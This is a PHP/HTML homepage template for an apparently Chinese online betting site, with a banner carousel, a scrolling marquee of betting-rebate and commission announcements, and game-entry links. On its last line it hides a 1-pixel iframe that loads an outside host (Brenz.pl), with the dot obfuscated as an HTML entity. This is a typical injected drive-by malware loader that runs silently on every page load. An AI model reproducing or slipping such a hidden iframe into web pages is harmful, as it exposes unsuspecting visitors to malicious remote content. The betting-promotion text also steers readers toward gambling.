<!DOCTYPE HTML>
<html>
<head>
<?php $this->display('inc_skin.php',0,''); ?>
<link rel="stylesheet" type="text/css" href="<?=$this->settings['templateurl'] ?>/template/css/index.css">
<script type="text/javascript" src="/wjinc/default/js/jquery.banner.js"></script>
</head>
<body>
<!--页头-->
<style type="text/css">
.user_logo{width:168px;height:56px;background:url(/img/index/logo2.png);text-align:center}
.a1{background-position: -32px -124px;}
.a1color{color: #08a09d}
</style>
<?php $this->display('inc_header.php'); ?>
<!--轮播开始-->
<div class="banner">
<div class="btns_bg cnt">
            <div class="banner_ad">
                <!--div class="ad_title icon_0">
                    <h6><i><img src="/img/index/gift.png"></i>最新活动</h6>
                    <a href="?tnt=eih" target="_blank">更多→</a>
                </div>
                <p>
                    <img src="/img/index/active0.png"></p-->
            </div>
        </div>
  <ul class="banList">
    <li class="active"><img src="/wjinc/default/images/banner1.jpg"/></li>
    <li><img src="/wjinc/default/images/banner2.jpg"/></li>
    <li><img src="/wjinc/default/images/banner3.jpg"/></li>
    <li><img src="/wjinc/default/images/banner4.jpg"/></li>
  </ul>
  <div class="fomW">
    <div class="jsNav" style="z-index:50;">
      <a href="javascript:void(0);" class="trigger current"></a>
      <a href="javascript:void(0);" class="trigger" ></a>
      <a href="javascript:void(0);" class="trigger"></a>
      <a href="javascript:void(0);" class="trigger"></a>
    </div>
  </div>
</div>
<script type="text/javascript"> 
$(function(){
  $(".banner").swBanner();
});
</script>
<!--轮播end-->
<!--滚动资讯开始-->
<div class="index_news">
<div class="m_wnews">
<div class="scrollText" id="scrollDiv">
                  <script>
var marqueeContent=new Array();
marqueeContent[0]='<i class="icon_0"></i><span>公告</span><a href="javascript:void(0)" target=_blank>重磅投注返利活动即将隆重推出啦！（01/05/2016 00:07:12 AM）</a>';
marqueeContent[1]='<i class="icon_0"></i><span>公告</span><a href="javascript:void(0)" target=_blank>重磅继续！二级佣金活动长期有效！（01/12/2015 3:07:47 PM）</a>';
marqueeContent[2]='<i class="icon_0"></i><span>公告</span><a href="javascript:void(0)" target=_blank>增强安全意识，以免资金损失！（04/17/2016 4:56:52 PM）</a>';
var marqueeInterval=new Array();
var marqueeId=0;
var marqueeDelay=2000;
var marqueeHeight=32;
function initMarquee() {
    var str=marqueeContent[0];
    document.write('<div id=marqueeBox style="overflow:hidden;height:'+marqueeHeight+'px" onmouseover="clearInterval(marqueeInterval[0])" onmouseout="marqueeInterval[0]=setInterval(\'startMarquee()\',marqueeDelay)"><div>'+str+'</div></div>');
    marqueeId++;
    marqueeInterval[0]=setInterval("startMarquee()",marqueeDelay);
    }
function startMarquee() {
    var str=marqueeContent[marqueeId];
        marqueeId++;
    if(marqueeId>=marqueeContent.length) marqueeId=0;
    if(marqueeBox.childNodes.length==1) {
        var nextLine=document.createElement('DIV');
        nextLine.innerHTML=str;
        marqueeBox.appendChild(nextLine);
        }
    else {
        marqueeBox.childNodes[0].innerHTML=str;
        marqueeBox.appendChild(marqueeBox.childNodes[0]);
        marqueeBox.scrollTop=0;
        }
    clearInterval(marqueeInterval[1]);
    marqueeInterval[1]=setInterval("scrollMarquee()",32);
    }
function scrollMarquee() {
    marqueeBox.scrollTop++;
    if(marqueeBox.scrollTop%marqueeHeight==(marqueeHeight-1)){
        clearInterval(marqueeInterval[1]);
        }
    }
initMarquee();
</script>
                </div>

<div class="pagesize">
<a href="javascript:void(0)" title="上一条" class="prev icon_0"></a>
<a href="javascript:void(0)" title="下一条" class="next icon_0"></a>
</div>
</div>
</div>
</div>
<!--滚动资讯end-->
<!--相册开始-->
<div class="index_way cnt">
        <div class="way_title">
            <span class="fl">
                <img src="/img/index/way_title.png"></span> <span class="fr">
                    <img src="/img/index/way_ad.png"></span>
        </div>
        <div class="way_img">
            <div class="way_one fl">
                <a class="way_top" href="?tnt=igm&type=20&groupId=26&played=" >
                    <img src="/img/index/way1.jpg"></a>
                    <a class="way_bottom" href="?tnt=igm&type=1&groupId=101&played=1037">
                        <img src="/img/index/way2.jpg"></a>
            </div>
            <div class="way_two fl">
                <a href="javascript:void(0)" onclick="future()">
                    <img src="/img/index/way3.jpg"></a></div>
            <div class="way_three fr">
                <a class="way_top" href="javascript:void(0)" onclick="future()">
                    <img src="/img/index/way4.jpg"></a>
                    <a class="way_bottom" href="javascript:void(0)" onclick="future()">
                        <img src="/img/index/way5.jpg"></a>
            </div>
        </div>
    </div>
<!--相册结束-->
   <!-- Modal -->
   <div class="modal fade" id="letter" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
      <div class="modal-dialog">
         <div class="modal-content" style="width:800px;  margin-left:-100px;">
         </div>
      </div>
   </div>
      
   <div class="modal fade" id="betInfo" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
      <div class="modal-dialog">
         <div class="modal-content" style="width:800px;  margin-left:-100px;">
         </div>
      </div>
   </div>
  
   <div class="modal fade" id="notice" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
      <div class="modal-dialog">
         <div class="modal-content" style="width:800px;  margin-left:-100px;">
         </div>
      </div>
   </div>
   <!-- Modal end-->
<?php $this->display('inc_footer.php') ?>
</div>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
